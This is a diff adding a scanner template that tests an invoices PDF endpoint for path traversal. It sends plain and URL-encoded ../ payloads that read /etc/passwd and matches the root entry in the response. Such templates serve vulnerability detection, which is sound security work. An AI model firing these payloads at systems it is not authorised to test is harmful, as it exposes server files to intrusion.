@@ -1,0 +1,16 @@
+id: path-traversal-file-param
+info:
+  name: Path traversal via file parameter
+  severity: high
+  description: A file/download parameter is joined onto a base directory without containment, so ../ sequences escape it and read arbitrary local files (/etc/passwd).
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/invoices/1/pdf?file=../../../../../../etc/passwd"
+      - "{{BaseURL}}/api/v1/invoices/1/pdf?file=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
